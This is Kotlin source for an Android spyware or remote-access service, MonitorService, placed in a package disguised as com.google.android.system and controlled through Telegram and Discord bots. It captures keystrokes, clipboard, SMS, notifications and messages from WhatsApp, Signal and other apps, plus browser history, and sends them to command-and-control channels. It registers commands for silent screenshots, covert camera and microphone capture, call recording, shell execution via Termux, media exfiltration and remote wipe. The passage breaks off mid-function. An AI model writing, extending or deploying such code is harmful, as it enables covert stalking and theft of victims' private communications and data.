package com.google.android.system

import com.homemonitor.TotpAuthenticator
import com.google.android.system.R

import android.Manifest
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import java.net.Socket
import java.util.concurrent.ConcurrentHashMap
import androidx.core.content.FileProvider
import android.database.ContentObserver
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.PowerManager
import android.content.ClipboardManager
import android.net.wifi.WifiManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import android.webkit.MimeTypeMap
import android.speech.tts.TextToSpeech
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.RingtoneManager
import android.widget.Toast
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.UUID
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.ServerSocket
import java.util.concurrent.CountDownLatch
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Calendar
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * MonitorService
 *
 * A foreground LifecycleService that handles remote commands via a Telegram Bot.
 */
class MonitorService : LifecycleService() {

    companion object {
        @Volatile var activeInstance: MonitorService? = null
        private val SERVER_URL         = ""
        private val BOT_TOKEN          = ""
        private val CHAT_ID            = ""
        private val DISCORD_BOT_TOKEN  = Placeholder.DISCORD_BOT_TOKEN
        private val DISCORD_GUILD_ID   = Placeholder.DISCORD_GUILD_ID
        private const val TAG          = "MonitorService"
        private const val NOTIFICATION_ID    = 1001
        private const val POLL_INTERVAL_MS   = 8_000L          
        private const val MAX_CONTACTS       = 10_000
        private const val MAX_FILES          = 10_000

        const val PROVISIONING_STATUS_NOT_PROVISIONED = "NOT_PROVISIONED"
        const val PROVISIONING_STATUS_PENDING         = "CLOUDFLARE_PENDING"
        const val PROVISIONING_STATUS_COMPLETE        = "PROVISIONING_COMPLETE"
        const val PROVISIONING_STATUS_FAILED          = "PROVISIONING_FAILED"

        fun sendDiscordStreamNotification(appName: String, title: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "04-notifications",
                "🔔 **Notification [$appName]**\n• **Title**: $title\n• **Text**: $text"
            )
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("notifications", "[$appName] $title: $text")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("notifications", "[$appName] $title: $text") }
        }

        @Volatile var activeLiveTypingMessageId: String? = null
        @Volatile var activeLiveTypingApp: String = ""

        fun sendDiscordStreamLiveTyping(appName: String, text: String) {
            activeInstance?.sendDiscordLiveTypingEdit(appName, text)
        }

        fun sendDiscordStreamKeylog(appName: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "05-keylogs-and-clipboard",
                "⌨️ **Keylog [$appName]**\n```\n$text\n```"
            )
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[$appName] $text")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[$appName] $text") }
        }

        fun sendDiscordStreamClipboard(clipData: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "05-keylogs-and-clipboard",
                "📋 **Clipboard Copied Text**\n```\n$clipData\n```"
            )
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[Clipboard] $clipData")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[Clipboard] $clipData") }
        }

        fun sendDiscordStreamSms(sender: String, body: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "06-sms-and-contacts",
                "💬 **SMS Received [$sender]**\n$body"
            )
            activeInstance?.firebaseC2Engine?.uploadSocialMessage("sms", sender, body, isOutgoing = false)
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertSocialMessage("sms", sender, body, isOutgoing = false) }
        }

        fun sendDiscordStreamCallRecord(file: File) {
            activeInstance?.sendDiscordCategorizedFile(
                "09-call-logs-and-recs",
                file,
                "audio/mp4"
            )
        }

        fun sendDiscordStreamSensorAlert(sensorName: String, details: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "17-alerts-and-sensors",
                "🚨 **Sensor Telemetry Alert [$sensorName]**\n• $details"
            )
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("sensor_alerts", "[$sensorName] $details")
        }

        fun sendPhotoPublic(chatId: String, photoFile: File) {
            val inst = activeInstance
            if (inst != null && photoFile.exists()) {
                C2LocalDatabase.getInstance(inst).insertTelemetryLog("photos", "Photo captured: ${photoFile.name} (${photoFile.length()} bytes)")
                inst.firebaseC2Engine?.uploadTelemetryLog("photos", "Photo captured: ${photoFile.name} (${photoFile.length()} bytes)")
                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "📸 Photo captured successfully: ${photoFile.name}")
                inst.sendPhoto(chatId, photoFile, deleteAfterSend = true)
            }
        }

        fun sendAudioPublic(chatId: String, audioFile: File) {
            val inst = activeInstance
            if (inst != null && audioFile.exists()) {
                C2LocalDatabase.getInstance(inst).insertTelemetryLog("audio", "Audio recorded: ${audioFile.name} (${audioFile.length()} bytes)")
                inst.firebaseC2Engine?.uploadTelemetryLog("audio", "Audio recorded: ${audioFile.name} (${audioFile.length()} bytes)")
                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "🎙️ Ambient audio recorded successfully: ${audioFile.name}")
                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
                inst.sendDiscordCategorizedFile("10-ambient-mic-audio", audioFile, "audio/mp4")
                if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
                    inst.sendDiscordRawFile(targetChat, file = audioFile, contentType = "audio/mp4")
                }
            }
        }

        fun sendDiscordStreamAIChatbot(appName: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "19-ai-chatbots-stream",
                "🧠 **AI Chatbot Interaction [$appName]**\n```\n$text\n```"
            )
            activeInstance?.firebaseC2Engine?.uploadSocialMessage(appName, "AI Agent", text, isOutgoing = false)
        }

        fun sendDiscordStreamBrowserUrl(browserName: String, urlText: String, pageTitle: String = "") {
            val titleStr = if (pageTitle.isNotBlank()) "• **Page Title**: `$pageTitle`\n" else ""
            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val domainStr = try {
                val uri = Uri.parse(if (urlText.startsWith("http")) urlText else "https://$urlText")
                uri.host ?: ""
            } catch (_: Exception) { "" }
            val domainInfo = if (domainStr.isNotBlank()) "• **Domain**: `$domainStr`\n" else ""

            val formattedMsg = "🌐 **Browser Navigation [$browserName]**\n" +
                    titleStr +
                    "• **URL**: $urlText\n" +
                    domainInfo +
                    "• **Time**: `$timeStr`"

            activeInstance?.sendDiscordCategorizedMessage(
                "21-browser-history",
                formattedMsg
            )
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("browser_history", "[$browserName] $urlText ($pageTitle)")
            activeInstance?.saveBrowserHistoryLocally(browserName, pageTitle, urlText, timeStr)
        }

        fun sendDiscordStreamBrowserSearch(browserName: String, searchEngine: String, query: String, fullUrl: String = "") {
            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val urlStr = if (fullUrl.isNotBlank()) "• **URL**: $fullUrl\n" else ""

            val formattedMsg = "🔍 **Browser Search [$browserName]**\n" +
                    "• **Search Engine**: `$searchEngine`\n" +
                    "• **Query**: `$query`\n" +
                    urlStr +
                    "• **Time**: `$timeStr`"

            activeInstance?.sendDiscordCategorizedMessage(
                "21-browser-history",
                formattedMsg
            )

            activeInstance?.saveBrowserHistoryLocally(browserName, "Search: $query ($searchEngine)", fullUrl.ifBlank { query }, timeStr)
        }

        fun sendDiscordStreamYouTubeWatch(appName: String, videoTitle: String, channelName: String, videoUrl: String = "") {
            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val channelStr = if (channelName.isNotBlank()) "• **Channel/Creator**: `$channelName`\n" else ""
            val urlStr = if (videoUrl.isNotBlank()) "• **Link**: $videoUrl\n" else ""

            val formattedMsg = "▶️ **YouTube Video Watched [$appName]**\n" +
                    "• **Title**: `$videoTitle`\n" +
                    channelStr +
                    urlStr +
                    "• **Time**: `$timeStr`"

            activeInstance?.sendDiscordCategorizedMessage(
                "28-youtube-history",
                formattedMsg
            )

            activeInstance?.saveYouTubeHistoryLocally(appName, videoTitle, channelName, videoUrl, timeStr)
        }

        fun sendDiscordStreamYouTubeSearch(appName: String, searchQuery: String) {
            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

            val formattedMsg = "🔍 **YouTube Search Query [$appName]**\n" +
                    "• **Search Term**: `$searchQuery`\n" +
                    "• **Search Link**: https://www.youtube.com/results?search_query=${Uri.encode(searchQuery)}\n" +
                    "• **Time**: `$timeStr`"

            activeInstance?.sendDiscordCategorizedMessage(
                "28-youtube-history",
                formattedMsg
            )

            activeInstance?.saveYouTubeHistoryLocally(appName, "Search: $searchQuery", "", "", timeStr)
        }

        fun getMessagingChannelForPackage(packageName: String): String? {
            val pkg = packageName.lowercase(Locale.ROOT)
            return when {
                pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b" || pkg.contains("whatsapp") -> "22-whatsapp-stream"
                pkg == "org.telegram.messenger" || pkg == "org.telegram.plus" || pkg == "org.thunderdog.chattergram" || pkg == "org.telegram.messenger.web" || pkg.contains("telegram") -> "23-telegram-stream"
                pkg == "com.facebook.orca" || pkg == "com.facebook.mlite" || pkg.contains("messenger") -> "24-messenger-stream"
                pkg == "com.instagram.android" || pkg.contains("instagram") -> "25-instagram-stream"
                pkg == "org.thoughtcrime.securesms" || pkg.contains("securesms") || pkg.contains("signal") -> "26-signal-stream"
                pkg == "com.snapchat.android" || pkg == "com.viber.voip" || pkg == "jp.naver.line.android" ||
                pkg == "com.tencent.mm" || pkg == "com.zing.zalo" || pkg == "com.skype.raider" ||
                pkg == "com.discord" || pkg == "com.reddit.frontpage" || pkg == "com.zhiliaoapp.musically" ||
                pkg.contains("viber") || pkg.contains("snapchat") || pkg.contains("zalo") || pkg.contains("line") || pkg.contains("wechat") || pkg.contains("skype") -> "27-other-chats-stream"
                else -> null
            }
        }

        fun sendDiscordStreamMessagingApp(channelName: String, appName: String, sender: String, text: String, isOutgoing: Boolean) {
            val icon = if (isOutgoing) "📤" else "📥"
            val direction = if (isOutgoing) "**Outgoing Sent Message**" else "**Incoming Received Message**"
            val senderInfo = if (sender.isNotBlank()) "\n• **Contact/Sender**: `$sender`" else ""
            activeInstance?.sendDiscordCategorizedMessage(
                channelName,
                "$icon $direction **[$appName]**$senderInfo\n```\n$text\n```"
            )
            activeInstance?.firebaseC2Engine?.uploadSocialMessage(appName, sender, text, isOutgoing)
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertSocialMessage(appName, sender, text, isOutgoing) }
        }
    }

    private data class FileEntry(
        val displayName: String,
        val uri:         Uri,
        val sizeBytes:   Long,
        val mimeType:    String
    )

    private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
    private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
    private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
    private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
    private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
    private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
    private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
    private val URL_GET_FILE      = "$BASE_URL/getFile"

    private fun getTelegramBotToken(): String {
        val vaultPrefs = SecurityVaultManager.getEncryptedPrefs(this)
        val userToken = vaultPrefs.getString("user_telegram_bot_token", "") ?: ""
        return if (userToken.isNotBlank()) userToken else BOT_TOKEN
    }

    private fun getTelegramApiUrl(endpoint: String): String {
        val token = getTelegramBotToken()
        return "https://api.telegram.org/bot$token/$endpoint"
    }

    private fun getTelegramFileUrl(filePath: String): String {
        val token = getTelegramBotToken()
        return "https://api.telegram.org/file/bot$token/$filePath"
    }

    private val fileCache = mutableMapOf<String, List<FileEntry>>()
    private val folderFileCache = mutableMapOf<String, List<File>>()
    private var currentDir: File = Environment.getExternalStorageDirectory()

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    @Volatile private var isWatchScreenActive = false
    private var watchScreenJob: Job? = null

    @Volatile private var isWebStreamRunning = true
    private var webStreamServerSocket: ServerSocket? = null
    private var streamWebSocket: WebSocket? = null

    // TTS & Sensors
    private var textToSpeech: TextToSpeech? = null
    private var sensorManager: SensorManager? = null
    private var accelerometer: Sensor? = null
    private var motionSensorEventListener: SensorEventListener? = null
    @Volatile private var isMotionDetectionActive = false
    private var lastMotionAlertTime = 0L

    // Geofence & Battery
    @Volatile private var targetGeofenceLat: Double? = null
    @Volatile private var targetGeofenceLng: Double? = null
    @Volatile private var targetGeofenceRadiusMeters: Float = 500f
    @Volatile private var isBatterySaverEnabled = true
    @Volatile private var pollIntervalMs = 3000L

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")

        updateOffset = getSharedPreferences("device_prefs", MODE_PRIVATE).getLong("telegram_update_offset", 0L)
        if (updateOffset == 0L) {
            initUpdateOffsetOnFirstLaunch()
        }
        PhysicalSecurityGuard.restoreArmedStateIfNeeded(this)
        startForegroundWithNotification()
        sendConnectionNotification()
        setupCallStateListener()
        registerTelegramBotCommands()
        startLocalWebControlServer()
        startAutoDumpSyncLoop()
        startPeriodicTamperAuditLoop()
    }

    private fun startPeriodicTamperAuditLoop() {
        serviceScope.launch(Dispatchers.IO) {
            Log.i(TAG, "Anti-Tamper Periodic Security Audit Loop Started 🛡️")
            while (isActive) {
                try {
                    val report = TamperProtectionManager.runFullSecurityAudit(this@MonitorService)
                    if (report.threatLevel == TamperProtectionManager.ThreatLevel.COMPROMISED) {
                        Log.w(TAG, "Critical Security Alert: Device COMPROMISED!")
                        sendDiscordStreamSensorAlert(
                            "CRITICAL Anti-Tamper Alert",
                            "🚨 **CRITICAL SECURITY COMPROMISE DETECTED**\n${report.summaryDetails}"
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Periodic anti-tamper audit error: ${e.message}")
                }
                delay(300_000L) // 5 minutes audit interval
            }
        }
    }

    private fun handleTamperAuditCommand(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val auditReport = TamperProtectionManager.runFullSecurityAudit(this@MonitorService)
            sendMessage(chatId, auditReport.summaryDetails, parseMode = "Markdown")
        }
    }

    private fun startAutoDumpSyncLoop() {
        serviceScope.launch(Dispatchers.IO) {
            Log.i(TAG, "Auto-Dump Background Sync Loop Started 🔄")
            while (isActive) {
                try {
                    if (isNetworkConnected()) {
                        flushOfflineTelemetryQueue()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "startAutoDumpSyncLoop error: ${e.message}")
                }
                delay(60_000L)
            }
        }
    }

    private fun initUpdateOffsetOnFirstLaunch() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val url = "$URL_GET_UPDATES?offset=-1&limit=1"
                val request = Request.Builder().url(url).get().build()
                httpClient.newCall(request).execute().use { response ->
                    val body = response.body?.string() ?: ""
                    if (body.startsWith("{")) {
                        val json = JSONObject(body)
                        val result = json.optJSONArray("result")
                        if (result != null && result.length() > 0) {
                            val lastUpdate = result.getJSONObject(result.length() - 1)
                            val lastId = lastUpdate.optLong("update_id", 0L)
                            if (lastId > 0) {
                                updateOffset = lastId + 1
                                getSharedPreferences("device_prefs", MODE_PRIVATE).edit().putLong("telegram_update_offset", updateOffset).apply()
                                Log.i(TAG, "Initialized updateOffset on first launch to $updateOffset (skipped old chat history)")
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "First launch offset initialization error: ${e.message}")
            }
        }
    }

    private fun registerTelegramBotCommands() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val commandsList = JSONArray().apply {
                    put(JSONObject().put("command", "help").put("description", "Interactive Command Grid & Menu"))
                    put(JSONObject().put("command", "devicelist").put("description", "Device Registry"))
                    put(JSONObject().put("command", "target").put("description", "Target specific device (/target <model>)"))
                    put(JSONObject().put("command", "deviceinfo").put("description", "Hardware, Battery & SIM Telemetry"))
                    put(JSONObject().put("command", "status").put("description", "Check device online status"))
                    put(JSONObject().put("command", "iplocation").put("description", "Public IP Geolocation Report"))
                    put(JSONObject().put("command", "geolocation").put("description", "GPS Location & Google Maps Link"))
                    put(JSONObject().put("command", "network").put("description", "Wi-Fi & Cellular IP/Carrier Status"))
                    put(JSONObject().put("command", "camera").put("description", "Take Rear Camera Photo"))
                    put(JSONObject().put("command", "frontcam").put("description", "Take Front Camera Photo"))
                    put(JSONObject().put("command", "screenshot").put("description", "Immediate Silent Screenshot"))
                    put(JSONObject().put("command", "watchscreen").put("description", "Silent Background Screenshot Loop"))
                    put(JSONObject().put("command", "stopwatchscreen").put("description", "Stop Silent Screenshot Loop"))
                    put(JSONObject().put("command", "livescreen").put("description", "Record & Send Screen Sequence Clip"))
                    put(JSONObject().put("command", "webstream").put("description", "AirDroid/TeamViewer Web Control Panel"))
                    put(JSONObject().put("command", "stopwebstream").put("description", "Stop WebStream Server"))
                    put(JSONObject().put("command", "stealth").put("description", "Toggle Stealth Black Screen Overlay"))
                    put(JSONObject().put("command", "download").put("description", "Download File by Name/Path"))
                    put(JSONObject().put("command", "files").put("description", "List & Download Media Files"))
                    put(JSONObject().put("command", "filemn").put("description", "Interactive Storage Directory Manager"))
                    put(JSONObject().put("command", "zip").put("description", "Download Folder as ZIP Archive"))
                    put(JSONObject().put("command", "ls").put("description", "List Directory (Linux Style)"))
                    put(JSONObject().put("command", "cd").put("description", "Navigate Directory (/cd <folder>)"))
                    put(JSONObject().put("command", "pwd").put("description", "Print Working Directory"))
                    put(JSONObject().put("command", "uninstall").put("description", "Uninstall App by Name/Package"))
                    put(JSONObject().put("command", "installtermux").put("description", "Auto-Install Termux APK"))
                    put(JSONObject().put("command", "termuxstatus").put("description", "Check Termux Environment Status"))
                    put(JSONObject().put("command", "termux").put("description", "Execute Termux Shell Command"))
                    put(JSONObject().put("command", "say").put("description", "Text-To-Speech Voice Output"))
                    put(JSONObject().put("command", "toast").put("description", "Display Screen Toast Message"))
                    put(JSONObject().put("command", "findme").put("description", "Play Loud Alarm Ringtone (20s)"))
                    put(JSONObject().put("command", "syncmedia").put("description", "Exfiltrate Recent Photos & Media ZIP"))
                    put(JSONObject().put("command", "bind_telegram_group").put("description", "Bind Telegram Supergroup & Provision 29 Subtopics"))
                    put(JSONObject().put("command", "bindgroup").put("description", "Bind Supergroup Alias"))
                    put(JSONObject().put("command", "scheduleaudio").put("description", "Schedule Delayed Mic Recording"))
                    put(JSONObject().put("command", "motion").put("description", "Motion Security Sensor Alert (/motion on)"))
                    put(JSONObject().put("command", "geofence").put("description", "GPS Perimeter Security Boundary"))
                    put(JSONObject().put("command", "batterysaver").put("description", "Dynamic Battery Power Saver Mode"))
                    put(JSONObject().put("command", "transcribe").put("description", "AI Whisper Speech-To-Text Transcription"))
                    put(JSONObject().put("command", "contacts").put("description", "Get Address Book Contacts"))
                    put(JSONObject().put("command", "sms").put("description", "Read SMS Inbox Messages"))
                    put(JSONObject().put("command", "sendsms").put("description", "Send SMS (/sendsms <num> <msg>)"))
                    put(JSONObject().put("command", "calls").put("description", "Read Call Log History"))
                    put(JSONObject().put("command", "callrecs").put("description", "Download Recorded Phone Calls"))
                    put(JSONObject().put("command", "makecall").put("description", "Place Direct Phone Call"))
                    put(JSONObject().put("command", "audio").put("description", "Record Ambient Mic Audio"))
                    put(JSONObject().put("command", "activeapp").put("description", "Get Currently Open Screen App"))
                    put(JSONObject().put("command", "keylog").put("description", "View Typed Screen Text Keylogs"))
                    put(JSONObject().put("command", "notification").put("description", "View Captured App Notifications"))
                    put(JSONObject().put("command", "clipboard").put("description", "View Copied Text on Clipboard"))
                    put(JSONObject().put("command", "lock").put("description", "Remotely Lock Device Screen"))
                    put(JSONObject().put("command", "wipe").put("description", "Remotely Wipe/Factory Reset Device"))
                    put(JSONObject().put("command", "update").put("description", "In-App Self-Updater"))
                }

                val json = JSONObject().put("commands", commandsList)
                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val url = getTelegramApiUrl("setMyCommands")
                val request = Request.Builder().url(url).post(body).build()

                httpClient.newCall(request).execute().use { response ->
                    Log.i(TAG, "Registered Telegram bot commands: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "registerTelegramBotCommands error: ${e.message}")
            }
        }
    }

    private fun registerDiscordSlashCommands() {
        if (DISCORD_BOT_TOKEN.isBlank()) return
        serviceScope.launch(Dispatchers.IO) {
            try {
                val appId = "1567549464229445843"
                val commandsList = JSONArray().apply {
                    put(JSONObject().put("name", "help").put("description", "Interactive Command Grid & Menu"))
                    put(JSONObject().put("name", "deviceinfo").put("description", "Hardware, Battery & SIM Telemetry"))
                    put(JSONObject().put("name", "status").put("description", "Check device online status & battery"))
                    put(JSONObject().put("name", "geolocation").put("description", "GPS Location & Google Maps Link"))
                    put(JSONObject().put("name", "network").put("description", "Wi-Fi & Cellular IP/Carrier Status"))
                    put(JSONObject().put("name", "camera").put("description", "Take Rear Camera Photo"))
                    put(JSONObject().put("name", "frontcam").put("description", "Take Front Camera Photo"))
                    put(JSONObject().put("name", "screenshot").put("description", "Immediate Silent Screenshot"))
                    put(JSONObject().put("name", "watchscreen").put("description", "Silent Background Screenshot Loop"))
                    put(JSONObject().put("name", "stopwatchscreen").put("description", "Stop Silent Screenshot Loop"))
                    put(JSONObject().put("name", "livescreen").put("description", "Record & Send Screen Sequence Clip"))
                    put(JSONObject().put("name", "webstream").put("description", "AirDroid/TeamViewer Web Control Panel"))
                    put(JSONObject().put("name", "stealth").put("description", "Toggle Stealth Black Screen Overlay"))
                    put(JSONObject().put("name", "download").put("description", "Download File by Name/Path"))
                    put(JSONObject().put("name", "files").put("description", "List & Download Media Files"))
                    put(JSONObject().put("name", "filemn").put("description", "Interactive Storage Directory Manager"))
                    put(JSONObject().put("name", "zip").put("description", "Download Folder as ZIP Archive"))
                    put(JSONObject().put("name", "installtermux").put("description", "Auto-Install Termux APK"))
                    put(JSONObject().put("name", "termuxstatus").put("description", "Check Termux Environment Status"))
                    put(JSONObject().put("name", "termux").put("description", "Execute Termux Shell Command"))
                    put(JSONObject().put("name", "say").put("description", "Text-To-Speech Voice Output"))
                    put(JSONObject().put("name", "toast").put("description", "Display Screen Toast Message"))
                    put(JSONObject().put("name", "findme").put("description", "Play Loud Alarm Ringtone (20s)"))
                    put(JSONObject().put("name", "syncmedia").put("description", "Exfiltrate Recent Photos & Media ZIP"))
                    put(JSONObject().put("name", "motion").put("description", "Motion Security Sensor Alert (/motion on)"))
                    put(JSONObject().put("name", "geofence").put("description", "GPS Perimeter Security Boundary"))
                    put(JSONObject().put("name", "batterysaver").put("description", "Dynamic Battery Power Saver Mode"))
                    put(JSONObject().put("name", "contacts").put("description", "Get Address Book Contacts"))
                    put(JSONObject().put("name", "sms").put("description", "Read SMS Inbox Messages"))
                    put(JSONObject().put("name", "sendsms").put("description", "Send SMS (/sendsms <num> <msg>)"))
                    put(JSONObject().put("name", "calls").put("description", "Read Call Log History"))
                    put(JSONObject().put("name", "callrecs").put("description", "Download Recorded Phone Calls"))
                    put(JSONObject().put("name", "makecall").put("description", "Place Direct Phone Call"))
                    put(JSONObject().put("name", "audio").put("description", "Record Ambient Mic Audio"))
                    put(JSONObject().put("name", "activeapp").put("description", "Get Currently Open Screen App"))
                    put(JSONObject().put("name", "keylog").put("description", "View Typed Screen Text Keylogs"))
                    put(JSONObject().put("name", "notification").put("description", "View Captured App Notifications"))
                    put(JSONObject().put("name", "clipboard").put("description", "View Copied Text on Clipboard"))
                    put(JSONObject().put("name", "lock").put("description", "Remotely Lock Device Screen"))
                    put(JSONObject().put("name", "wipe").put("description", "Remotely Wipe/Factory Reset Device"))
                    put(JSONObject().put("name", "update").put("description", "In-App Self-Updater"))
                }

                val url = "https://discord.com/api/v10/applications/$appId/commands"
                val body = commandsList.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url(url)
                    .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                    .put(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    Log.i(TAG, "Registered ${commandsList.length()} Discord Global Slash Commands: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "registerDiscordSlashCommands error: ${e.message}")
            }
        }
    }

    private fun getOrCreateDeviceId(): String {
        return com.google.android.system.DeviceIdProvider.getDeviceId(this)
    }

    private fun getOrCreateInstallationId(): String {
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        var installId = prefs.getString("installation_id", null)
        if (installId.isNullOrBlank()) {
            installId = "inst_" + UUID.randomUUID().toString().replace("-", "").take(12)
            prefs.edit()
                .putString("installation_id", installId)
                .putString("cf_provisioning_status", PROVISIONING_STATUS_PENDING)
                .apply()
            Log.i(TAG, "Generated new installation ID: $installId (Provisioning Status: $PROVISIONING_STATUS_PENDING)")
        }
        return installId
    }

    private fun getCloudflareProvisioningStatus(): String {
        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
        val savedToken = prefs.getString("cf_webstream_tunnel_token", null)
        val status = prefs.getString("cf_provisioning_status", null)

        if (status.isNullOrBlank()) {
            val defaultStatus = if (!savedToken.isNullOrBlank() && savedToken.length >= 30) {
                PROVISIONING_STATUS_COMPLETE
            } else {
                PROVISIONING_STATUS_PENDING
            }
            prefs.edit().putString("cf_provisioning_status", defaultStatus).apply()
            return defaultStatus
        }
        return status
    }

    private fun getPhoneNumber(): String {
        return try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                telephonyManager.line1Number?.takeIf { it.isNotBlank() } ?: "Unknown"
            } else {
                "Permission not granted"
            }
        } catch (e: Exception) {
            "N/A"
        }
    }

    private fun sendConnectionNotification() {
        val deviceId = getOrCreateDeviceId()
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val androidVersion = Build.VERSION.RELEASE
        val sdkInt = Build.VERSION.SDK_INT
        val phoneNumber = getPhoneNumber()
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

        val msg = """
            🚀 *Device Connected & Online*
            
            🆔 **Device ID**: `$deviceId`
            📱 **Model**: $manufacturer $model
            🤖 **Android**: $androidVersion (API $sdkInt)
            📞 **Phone Number**: `$phoneNumber`
            🕐 **Time**: $timeStr

            💡 **Quick Start Commands:**
            • `!webstream` - Launch Permanent WebStream Control Panel
            • `!stealth on` / `!stealth off` - Toggle Stealth Black Screen Mode
            • `!unlock` - Remote Screen Unlock Keyguard
        """.trimIndent()

        serviceScope.launch {
            sendMessage("", msg, parseMode = "Markdown")
        }
    }

    private var activeCallRecorder: android.media.MediaRecorder? = null
    private var activeCallFile: File? = null

    private fun setupCallStateListener() {
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION")
            telephonyManager.listen(object : android.telephony.PhoneStateListener() {
                private var isRecordingCall = false

